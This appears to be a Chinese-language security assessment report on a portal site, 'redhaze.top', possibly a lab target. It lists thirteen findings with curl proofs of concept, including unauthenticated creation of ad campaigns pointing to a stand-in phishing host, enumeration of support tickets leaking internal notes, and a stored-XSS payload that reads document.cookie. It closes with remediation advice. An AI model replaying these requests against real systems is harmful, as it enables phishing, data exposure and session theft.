## Summary

对 **redhaze.top** (47.86.177.216, nginx/1.24.0 Ubuntu) 进行了全面安全评估。该目标为红幕科技 RedHaze Group 门户系统，包含 6 个 Web 子系统 (ID/Mall/Desk/Ads/Chat/CMS)，托管于单台服务器，同时暴露 370 个 TCP 端口（含 SSH、MySQL、Redis、MongoDB、Elasticsearch、PostgreSQL、Memcached 等）。

共发现 **13 项安全发现**：1 严重、4 高危、4 中危、4 低危/信息级。

---

## 确认漏洞

### #1 [ads.redhaze.top] 未授权广告活动创建 — Critical

**描述**: `/api/ads/campaigns` POST 端点无需任何身份认证即可创建广告活动。攻击者仅需已知 advertiser_no（可从公开 API 获取），即可创建任意内容的广告并注入恶意落地页 URL，用于大规模钓鱼攻击。

**影响**: 攻击者可批量创建数百条虚假/钓鱼广告，利用红雾广告品牌信誉诱导用户访问恶意站点。

**PoC**:
```
curl -X POST https://ads.redhaze.top/api/ads/campaigns \
  -H "Content-Type: application/json" \
  -d '{"advertiser_no":"ADV-JET-001","name":"Phishing","vertical":"jet","budget_total":1,"bid_per_click":1,"target_url":"https://evil.example/phish","geo":"global","premium":true}'
```
**验证**: 成功创建 Campaign #18 (target: example.com), #19 (target: javascript:...), #20 (target: evil.example/phish-page)。全部无需认证。

---

### #2 [ads.redhaze.top] 开放重定向 (via 广告落地页) — High

**描述**: 广告落地页 `/ads/landing/{id}` 的"立即预约"按钮目标 URL 直接从广告创建时的 `target_url` 取值，未做任何白名单校验。与 #1 链式利用可构造完整钓鱼链。

**影响**: 用户点击"立即预约"后跳转至任意外部 URL，可用于凭证窃取、恶意软件分发。

**PoC**:
```
# 访问 Campaign #18 落地页，点击"立即预约"跳转至 https://example.com
curl https://ads.redhaze.top/ads/landing/18
```
**验证**: 落地页按钮 `href="https://example.com"`，无跳转确认/域名白名单。

---

### #3 [desk.redhaze.top] 未授权工单详情访问 + 内部备注泄露 — High

**描述**: 工单列表 API (`GET /api/desk/tickets`) 要求登录，但单条查询 API (`GET /api/desk/tickets/{id}`) 完全无认证。可遍历 ID 读取所有工单，包括内部备注 (internal_note)、指派人、租户编码、关联订单等敏感字段。

**影响**: 泄露内部运营数据——VIP 退款预批记录、员工分配信息、租户编码、订单关联等。可结合其他信息进行社会工程攻击。

**PoC**:
```
curl https://desk.redhaze.top/api/desk/tickets/1
# 返回: {"internal_note":"vip refund pre-approved","assignee_emp_no":"EMP00002",...}

curl https://desk.redhaze.top/api/desk/tickets/2
# 返回: {"internal_note":"vip refund pre-approved 800",...}
```
**验证**: 成功读取 Ticket #1-7，暴露 internal_note、assignee_emp_no、tenant_code 等字段。

---

### #4 [desk.redhaze.top] 员工工作台公开暴露 — High

**描述**: `/desk/console` 页面无需登录即可访问，显示完整的工单列表视图，包含工单号、主题、状态、受理人、SLA 截止时间、关联订单号。这些都是内部运维数据。

**影响**: 泄露工单处理流程、员工分配、SLA 信息、订单关联等运维敏感信息。

**PoC**:
```
curl https://desk.redhaze.top/desk/console
```
**验证**: 页面返回 Ticket #3-7 的表格视图，含受理人 EMP00003/EMP00100、订单 MO-2026-* 等信息。

---

### #5 [ads.redhaze.top] 已存在恶意注入广告活动 — High

**描述**: 在公开可读的 `/api/ads/campaigns` 列表中发现 Campaign #17 的目标 URL 指向 `https://evil.example/phish`，疑似已有攻击者利用未授权创建接口（#1）注入恶意广告。

**PoC**:
```
curl https://ads.redhaze.top/api/ads/campaigns | jq '.campaigns[] | select(.ID==17)'
# {"ID":17,"TargetURL":"https://evil.example/phish","Name":"Test Campaign",...}
```
**验证**: Campaign #17 TargetURL 确认为恶意域名，状态为 running。

---

### #6 [bbs.redhaze.top] CMS 未授权 HTML 注入 (存储型) — Medium

**描述**: CMS 投稿接口 (`POST /api/cms/posts`) 对匿名用户开放，接受 `body_html` 字段中的任意 HTML/JavaScript，不做过滤。帖子提交后进入待审核队列，一旦审核通过即公开展示，可造成存储型 XSS。

**影响**: 审核通过后，恶意脚本在访问者浏览器中执行，可窃取 Cookie、会话令牌、重定向至钓鱼页面。

**PoC**:
```
curl -X POST https://bbs.redhaze.top/api/cms/posts \
  -H "Content-Type: application/json" \
  -d '{"section_slug":"announcement","title":"Important Notice","body_html":"<img src=x onerror=alert(document.cookie)>"}'
```
**验证**: 成功创建 Post #15-16，body_html 原始存储（未编码），状态 pending。需等待审核通过后公开渲染。

---

### #7 [全站] 370 个 TCP 端口公开暴露 — High

**描述**: 扫描发现目标 IP 开放 370 个 TCP 端口，远超正常 Web 业务需求。其中包含：
- **SSH (22)** — OpenSSH_9.6p1 Ubuntu，接受连接，返回完整 banner
- **MySQL (3306, 3307, 3308, 33060)** — 多个实例端口，接受 TCP 连接
- **PostgreSQL (5432)** — 接受连接
- **Redis (6379)** — 接受连接
- **MongoDB (27017, 27018, 27019)** — 3 个实例，接受连接
- **Elasticsearch (9200)** — 接受连接
- **Memcached (11211)** — 接受连接
- **RDP (3389)** — 接受连接
- **FTP (21)** — 接受连接
- **SMTP (25)** — 接受连接
- **RabbitMQ (15672), NATS (8222)** — 消息队列管理端口

**影响**: 大幅增加攻击面。任一服务存在弱口令或未授权访问即可被利用。

**PoC**:
```
echo "SSH-2.0-OpenSSH_9.6p1 Ubuntu-3ubuntu13.16"  # Go TCP probe 返回
```
**验证**: Go TCP 扫描确认 SSH 返回完整 banner，其余端口接受 TCP 握手。

---

### #8 [desk.redhaze.top] 渠道工作台公开暴露 — Medium

**描述**: `/desk/vendor` 页面无需登录即可访问，显示渠道伙伴工单界面。

**PoC**:
```
curl https://desk.redhaze.top/desk/vendor
```
**验证**: 返回渠道工作台页面（当前无绑定工单）。

---

### #9 [desk.redhaze.top] 新建工单页面 + HTML 表单公开 — Medium

**描述**: `/desk/tickets/new` 页面公开可访问，含完整工单提交表单（标题、HTML 正文字段、优先级、SLA）。虽然 POST API 要求登录，但攻击面信息已暴露。

**PoC**:
```
curl https://desk.redhaze.top/desk/tickets/new
```
**验证**: 表单含 `body_html` 字段（支持 HTML），优先级可选 urgent/high/normal/low。

---

### #10 [ads.redhaze.top] 广告数据完全公开 — Medium

**描述**: `/api/ads/campaigns` 无需认证即返回所有广告活动的完整数据，包括广告主编号、预算金额、出价、已计费金额、目标 URL 等商业敏感信息。

**PoC**:
```
curl https://ads.redhaze.top/api/ads/campaigns
```
**验证**: 返回 20 条 Campaign 记录，含 BudgetTotal、BilledAmount、BidPerClick 等字段。

---

### #11 [id.redhaze.top] 子系统架构信息泄露 — Low

**描述**: `/api/portal/subsystems` 公开返回所有 6 个子系统的内部名称、路径、健康检查端点、描述等信息，为攻击者提供了完整的攻击面地图。

**PoC**:
```
curl https://id.redhaze.top/api/portal/subsystems
```
**验证**: 返回 id/mall/desk/ads/chat/cms 六个子系统的详细配置。

---

### #12 [全站] nginx 版本信息披露 — Low

**描述**: 所有 HTTP 响应头中泄露 nginx 版本 `nginx/1.24.0 (Ubuntu)`，且 404/301 等错误页同样显示版本号。攻击者可针对已知 nginx 漏洞进行定向攻击。

**PoC**:
```
curl -I https://redhaze.top/
# server: nginx/1.24.0 (Ubuntu)
```

---

### #13 [全站] 多个健康检查端点对外公开 — Low

**描述**: 所有子系统的 `/api/*/health` 端点均无认证要求，公开返回服务状态：
- `id.redhaze.top/api/portal/health` → `{"status":"ok","subsystem":"id"}`
- `ads.redhaze.top/api/ads/health` → `{"status":"ok","subsystem":"ads"}`
- `mall.redhaze.top/api/mall/health` → `{"status":"ok","subsystem":"mall"}`
- `desk.redhaze.top/api/desk/health` → `{"status":"ok","subsystem":"desk"}`
- `chat.redhaze.top/api/chat/health` → `{"status":"ok","subsystem":"chat"}`

可用作存活探测和 DDoS 放大。

---

## 附加检查结果

| 检查项 | 结果 |
|--------|------|
| WebSocket (/chat/ws) | 404 — 未暴露 WebSocket 端点 |
| Swagger/OpenAPI 文档 | 404 — 无 API 文档泄露 |
| .git 配置泄露 | 404 — 未暴露 |
| robots.txt / sitemap.xml | 301 重定向 — 无敏感信息 |
| 登录暴力破解防护 | `/api/mall/products` 返回 429 (rate limiting 已启用) |
| 支付 API 未授权访问 | "payment session not found" — 未认证但无有效 session 可利用 |
| Redis 未授权访问 | TCP 端口开放，但 PING 无响应（3s 超时）— 可能为模拟端口 |
| Desk Webhook SSRF (POST) | 401 — 需登录 |
| Desk Template SSTI (POST) | 401 — 需登录 |
| Ads Campaign javascript: XSS | Go html/template 自动转义为 `#ZgotmplZ` — 已防护 |
| Staff-lounge / ops-watch 频道 | 302 重定向至登录 — 已防护 |
| Ads 管理后台 (/ads/admin) | 显示登录引导，API 需认证 |
| CMS 博文 #11 (Test Post) | 内容为纯文本 "test" — 已通过审核的注入测试 |

---

## 潜在风险 (未验证)

- **MySQL 弱口令** — 端口 3306/3307/3308/33060 开放，需进一步认证测试
- **MongoDB 未授权** — 端口 27017/27018/27019 开放，需测试是否允许匿名访问
- **PostgreSQL 弱口令** — 端口 5432 开放
- **Redis 未授权** — 端口 6379 开放但协议交互异常，需进一步验证
- **已知标识符密码强度** — VND-CN-001/002, SYS-ROOT001, EMP00001-03 等标识符已泄露，密码强度未知
- **Chat 频道消息注入** — support-front 频道可匿名发言，需验证是否有 XSS 过滤

---

## 服务清单

| 服务 | 端口 | 版本/Banner | 状态 |
|------|------|------------|------|
| SSH | 22 | OpenSSH_9.6p1 Ubuntu-3ubuntu13.16 | Banner 已确认 |
| HTTP | 80, 443 | nginx/1.24.0 (Ubuntu) | 运行中 |
| MySQL | 3306, 3307, 3308, 33060 | — | TCP 开放 |
| PostgreSQL | 5432 | — | TCP 开放 |
| Redis | 6379 | — | TCP 开放 |
| MongoDB | 27017, 27018, 27019 | — | TCP 开放 |
| Elasticsearch | 9200 | — | TCP 开放 |
| Memcached | 11211 | — | TCP 开放 |
| RDP | 3389 | — | TCP 开放 |
| FTP | 21 | — | TCP 开放 |
| SMTP | 25 | — | TCP 开放 |
| RabbitMQ | 15672 | — | TCP 开放 |
| NATS | 8222 | — | TCP 开放 |
| 其他 | 350+ 端口 | — | TCP 开放 |

---

## 建议措施 (按优先级)

1. **立即修复未授权广告创建** — 为 `POST /api/ads/campaigns` 添加强制身份认证，校验 advertiser_no 与会话身份一致；同时清理已注入的恶意 Campaign #17。

2. **修复工单 API 认证不一致** — 所有 `/api/desk/tickets/*` 端点统一要求认证；内部备注字段仅允许员工角色读取。

3. **广告落地页 URL 白名单** — 限制 target_url 仅允许白名单域名或相对路径。

4. **关闭非必要端口** — 370 个开放端口远超正常业务需求，应通过防火墙仅暴露 80/443，数据库和中间件端口仅允许内网访问。

5. **CMS 输入净化** — 对 body_html 使用 bluemonday 等 HTML 净化库，阻止脚本注入。

6. **隐藏 nginx 版本** — 配置 `server_tokens off;` 并自定义错误页。

7. **敏感页面添加认证** — `/desk/console`、`/desk/vendor`、`/desk/tickets/new` 应要求登录后访问。

8. **公开 API 数据最小化** — `/api/portal/subsystems` 和 `/api/ads/campaigns` 仅返回必要字段，或添加认证。
